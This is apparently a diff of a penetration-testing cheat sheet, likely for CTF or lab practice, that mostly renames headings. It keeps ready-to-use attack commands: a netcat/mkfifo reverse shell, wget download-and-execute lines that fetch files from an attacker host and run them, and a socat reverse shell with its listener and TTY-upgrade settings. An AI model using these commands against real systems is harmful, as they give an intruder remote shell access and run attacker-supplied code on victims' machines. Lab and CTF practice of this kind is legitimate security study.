@@ -24,7 +24,7 @@
 - [John the Ripper](john.md)
 - [Hashcat](hashcat.md)
 
-## Exploit by service
+## Workflow by service
 - [SSH](ssh.md)
 - [SMB](smb.md)
 - [Telnet](telnet.md)
@@ -34,12 +34,12 @@
 - [MySQL](mysql.md)
 
 ## Useful Commands
-Generate shell payload
+### Shell payload
 ```
 echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f" > shell.sh
 ```
 
-Download file from local Web server on kali
+### Download local file
 ```
 FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; sh /tmp/$FILE
 ```
@@ -50,17 +50,17 @@ wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh;
 ```
 
 ### Socat
-・Target Host  
+#### Target
 ```
 wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4445
 ```
 
-・Attacker (Kali)
+#### Attacker (Kali)
 ```
 socat file:`tty`,raw,echo=0 TCP-L:4445
 ```
 
-+α settings :
+#### To upgrade more
 ```
 export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
